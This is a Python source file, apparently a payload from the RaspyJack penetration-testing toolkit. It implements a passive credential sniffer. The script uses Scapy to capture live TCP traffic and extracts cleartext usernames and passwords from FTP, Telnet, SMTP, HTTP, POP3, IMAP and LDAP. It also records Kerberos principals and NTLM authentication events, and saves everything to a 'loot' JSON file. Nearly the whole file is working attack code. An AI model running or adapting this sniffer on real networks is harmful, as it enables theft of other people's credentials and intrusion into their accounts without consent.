#!/usr/bin/env python3
# @name: Multi-Protocol Credential Sniffer
# @desc: Passively inspect live TCP traffic with Scapy for cleartext HTTP, FTP, SMTP, POP3, IMAP, Telnet, and Basic-Auth credentials, then save findings to loot.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Multi-Protocol Credential Sniffer
=======================================================
Author: 7h30th3r0n3

Passive credential sniffer using Scapy. Captures cleartext and
encoded credentials from multiple protocols:

  FTP (21), Telnet (23), SMTP (25), HTTP (80), Kerberos (88),
  POP3 (110), IMAP (143), LDAP (389), SMB/NTLM (445)

Controls:
  python3 cred_sniffer_multi.py [iface] [duration_seconds]

  iface             -- network interface to sniff on (default: auto-detect
                        the interface with the default route)
  duration_seconds  -- stop automatically after N seconds (default: run
                        until Ctrl-C)

  Captured credentials are printed as they are found and exported to
  loot when sniffing stops.

Loot: $CITYPOP_ROOT/loot/CredSniff/
"""

import os
import sys
import time
import json
import base64
import signal
import threading
import subprocess
import re
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'CredSniff')
os.makedirs(LOOT_DIR, exist_ok=True)

PROTOCOLS = ["FTP", "Telnet", "SMTP", "HTTP", "Kerberos",
             "POP3", "IMAP", "LDAP", "SMB"]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
credentials = []        # list of dicts
proto_counts = {p: 0 for p in PROTOCOLS}
status_msg = "Idle"
sniffing = False
running = True

_sniff_thread = None

# ---------------------------------------------------------------------------
# Active interface detection
# ---------------------------------------------------------------------------

def _get_active_iface():
    """Return the first interface with a default route."""
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                idx = parts.index("dev") + 1
                if idx < len(parts):
                    return parts[idx]
    except Exception:
        pass
    return "eth0"


# ---------------------------------------------------------------------------
# Credential capture helpers
# ---------------------------------------------------------------------------

def _add_cred(protocol, src_ip, dst_ip, username, password):
    """Thread-safe credential append."""
    entry = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "protocol": protocol,
        "src_ip": src_ip,
        "dst_ip": dst_ip,
        "username": username,
        "password": password,
    }
    with lock:
        credentials.append(entry)
        proto_counts[protocol] = proto_counts.get(protocol, 0) + 1
    print(f"[{entry['timestamp']}] {protocol} {src_ip} -> {dst_ip} "
          f"{username}:{password}", flush=True)


def _safe_b64_decode(data):
    """Attempt base64 decode, return original on failure."""
    try:
        decoded = base64.b64decode(data).decode("utf-8", errors="replace")
        return decoded
    except Exception:
        return data


# ---------------------------------------------------------------------------
# Protocol parsers (called from scapy sniff callback)
# ---------------------------------------------------------------------------

# Session state for multi-packet protocols
_ftp_sessions = {}   # (src,dst) -> {"user": ...}
_pop3_sessions = {}
_smtp_sessions = {}
_telnet_sessions = {}


def _parse_ftp(pkt, payload, src, dst):
    """Parse FTP USER/PASS commands."""
    key = (src, dst)
    upper = payload.upper()
    if upper.startswith("USER "):
        _ftp_sessions[key] = {"user": payload[5:].strip()}
    elif upper.startswith("PASS "):
        user = _ftp_sessions.pop(key, {}).get("user", "<unknown>")
        _add_cred("FTP", src, dst, user, payload[5:].strip())


def _parse_telnet(pkt, payload, src, dst):
    """Heuristic telnet credential detection."""
    key = (src, dst)
    lower = payload.lower()
    if "login:" in lower or "username:" in lower:
        _telnet_sessions[key] = {"state": "expect_user"}
    elif key in _telnet_sessions:
        state = _telnet_sessions[key].get("state", "")
        if state == "expect_user":
            _telnet_sessions[key] = {"state": "expect_pass", "user": payload.strip()}
        elif state == "expect_pass":
            user = _telnet_sessions[key].get("user", "<unknown>")
            _add_cred("Telnet", src, dst, user, payload.strip())
            _telnet_sessions.pop(key, None)


def _parse_smtp(pkt, payload, src, dst):
    """Parse SMTP AUTH LOGIN and AUTH PLAIN."""
    key = (src, dst)
    upper = payload.upper()
    if "AUTH LOGIN" in upper:
        _smtp_sessions[key] = {"state": "expect_user"}
    elif "AUTH PLAIN" in upper:
        parts = payload.split()
        if len(parts) >= 3:
            decoded = _safe_b64_decode(parts[2])
            # AUTH PLAIN format: \x00user\x00pass
            segments = decoded.split("\x00")
            if len(segments) >= 3:
                _add_cred("SMTP", src, dst, segments[1], segments[2])
    elif key in _smtp_sessions:
        state = _smtp_sessions[key].get("state", "")
        if state == "expect_user":
            _smtp_sessions[key] = {
                "state": "expect_pass",
                "user": _safe_b64_decode(payload.strip()),
            }
        elif state == "expect_pass":
            user = _smtp_sessions[key].get("user", "<unknown>")
            _add_cred("SMTP", src, dst, user, _safe_b64_decode(payload.strip()))
            _smtp_sessions.pop(key, None)


def _parse_pop3(pkt, payload, src, dst):
    """Parse POP3 USER/PASS commands."""
    key = (src, dst)
    upper = payload.upper()
    if upper.startswith("USER "):
        _pop3_sessions[key] = {"user": payload[5:].strip()}
    elif upper.startswith("PASS "):
        user = _pop3_sessions.pop(key, {}).get("user", "<unknown>")
        _add_cred("POP3", src, dst, user, payload[5:].strip())


def _parse_imap(pkt, payload, src, dst):
    """Parse IMAP LOGIN command."""
    match = re.search(r'LOGIN\s+"?([^"\s]+)"?\s+"?([^"\s]+)"?', payload, re.I)
    if match:
        _add_cred("IMAP", src, dst, match.group(1), match.group(2))


def _parse_http(pkt, payload, src, dst):
    """Parse HTTP Basic Auth and POST form credentials."""
    # Basic Auth
    auth_match = re.search(
        r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", payload,
    )
    if auth_match:
        decoded = _safe_b64_decode(auth_match.group(1))
        if ":" in decoded:
            user, passwd = decoded.split(":", 1)
            _add_cred("HTTP", src, dst, user, passwd)

    # POST form data
    if payload.upper().startswith("POST "):
        body_match = re.search(r"\r\n\r\n(.+)", payload, re.DOTALL)
        if body_match:
            body = body_match.group(1)
            user_match = re.search(
                r"(?:user(?:name)?|email|login)=([^&\s]+)", body, re.I,
            )
            pass_match = re.search(
                r"(?:pass(?:word)?|pwd)=([^&\s]+)", body, re.I,
            )
            if user_match and pass_match:
                _add_cred("HTTP", src, dst,
                           user_match.group(1), pass_match.group(1))


def _parse_ldap(pkt, payload, src, dst):
    """Detect LDAP simple bind with DN and password."""
    # Simple bind: look for common DN patterns followed by password bytes
    dn_match = re.search(r"(cn=|uid=|dc=)([^\x00]+)", payload, re.I)
    if dn_match and len(payload) > 20:
        dn_str = payload[payload.find(dn_match.group(0)):]
        # Heuristic: extract printable sequences as potential credentials
        printable = re.findall(r"[\x20-\x7e]{3,}", dn_str)
        if len(printable) >= 2:
            _add_cred("LDAP", src, dst, printable[0], printable[1])


def _parse_kerberos(pkt, payload, src, dst):
    """Extract principal names from Kerberos AS-REQ."""
    # Look for KRB5 AS-REQ pattern and extract realm/principal
    principal_match = re.search(r"([\x20-\x7e]{3,}@[\x20-\x7e]{3,})", payload)
    if principal_match:
        _add_cred("Kerberos", src, dst, principal_match.group(1), "<krb5_as_req>")


def _parse_smb_ntlm(pkt, payload, src, dst):
    """Detect NTLMv2 challenge/response in SMB traffic."""
    if b"NTLMSSP" in payload.encode("latin-1", errors="replace"):
        # Type 3 message (authenticate) has challenge/response
        idx = payload.find("NTLMSSP")
        if idx >= 0 and len(payload) > idx + 12:
            msg_type_byte = ord(payload[idx + 8]) if idx + 8 < len(payload) else 0
            if msg_type_byte == 3:
                # Extract domain/user from NTLMSSP Type 3
                user_match = re.search(r"[\x20-\x7e]{2,}", payload[idx + 36:])
                user_str = user_match.group(0) if user_match else "<ntlm_user>"
                _add_cred("SMB", src, dst, user_str, "<NTLMv2_hash>")


# ---------------------------------------------------------------------------
# Scapy sniff thread
# ---------------------------------------------------------------------------

def _sniff_loop(iface):
    """Main scapy sniff loop."""
    global sniffing, status_msg
    try:
        from scapy.all import sniff as scapy_sniff, TCP, IP
    except ImportError:
        with lock:
            status_msg = "scapy not installed!"
        print("[!] scapy not installed!", flush=True)
        return

    port_parsers = {
        21: _parse_ftp,
        23: _parse_telnet,
        25: _parse_smtp,
        80: _parse_http,
        88: _parse_kerberos,
        110: _parse_pop3,
        143: _parse_imap,
        389: _parse_ldap,
        445: _parse_smb_ntlm,
    }

    def _process_pkt(pkt):
        if not running or not sniffing:
            return
        if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
            return
        try:
            tcp = pkt[TCP]
            ip_layer = pkt[IP]
            raw_payload = bytes(tcp.payload)
            if not raw_payload:
                return
            payload_str = raw_payload.decode("latin-1", errors="replace")
            src = ip_layer.src
            dst = ip_layer.dst
            sport = tcp.sport
            dport = tcp.dport

            for port, parser in port_parsers.items():
                if dport == port or sport == port:
                    parser(pkt, payload_str, src, dst)
                    break
        except Exception:
            pass

    with lock:
        status_msg = f"Sniffing on {iface}..."

    try:
        scapy_sniff(
            iface=iface,
            prn=_process_pkt,
            store=False,
            stop_filter=lambda _: not running or not sniffing,
            filter="tcp",
        )
    except Exception as exc:
        with lock:
            status_msg = f"Sniff error: {exc}"
        print(f"[!] Sniff error: {exc}", flush=True)


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_creds():
    """Export captured credentials to loot directory."""
    with lock:
        creds_copy = list(credentials)
    if not creds_copy:
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(creds_copy, fh, indent=2)
        return path
    except Exception as exc:
        print(f"[!] Export failed: {exc}", flush=True)
        return None


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, sniffing, _sniff_thread

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 cred_sniffer_multi.py [iface] [duration_seconds]", flush=True)
        sys.exit(0)

    iface = sys.argv[1] if len(sys.argv) > 1 else _get_active_iface()
    duration = None
    if len(sys.argv) > 2:
        try:
            duration = float(sys.argv[2])
        except ValueError:
            print(f"[!] Invalid duration: {sys.argv[2]}", flush=True)
            sys.exit(1)

    print(f"[*] Multi-protocol credential sniffer starting on {iface}", flush=True)
    if duration:
        print(f"[*] Will stop automatically after {duration:.0f}s (Ctrl-C to stop early)", flush=True)
    else:
        print("[*] Press Ctrl-C to stop.", flush=True)

    sniffing = True
    _sniff_thread = threading.Thread(target=_sniff_loop, args=(iface,), daemon=True)
    _sniff_thread.start()

    start_time = time.time()
    last_report = 0.0

    try:
        while running:
            time.sleep(0.5)
            elapsed = time.time() - start_time

            if elapsed - last_report >= 5:
                last_report = elapsed
                with lock:
                    total = len(credentials)
                    counts = dict(proto_counts)
                summary = ", ".join(f"{p}:{c}" for p, c in counts.items() if c)
                print(f"[*] {elapsed:.0f}s elapsed, {total} credential(s) captured"
                      + (f" ({summary})" if summary else ""), flush=True)

            if duration and elapsed >= duration:
                break
    except KeyboardInterrupt:
        print("\n[*] Stopping...", flush=True)
    finally:
        running = False
        sniffing = False

        if _sniff_thread and _sniff_thread.is_alive():
            _sniff_thread.join(timeout=3)

        with lock:
            total = len(credentials)
            counts = dict(proto_counts)

        print(f"[*] Sniffing stopped. {total} credential(s) captured.", flush=True)
        for proto in PROTOCOLS:
            if counts.get(proto):
                print(f"    {proto}: {counts[proto]}", flush=True)

        loot_path = _export_creds()
        if loot_path:
            print(f"[*] Credentials exported to {loot_path}", flush=True)


if __name__ == "__main__":
    main()
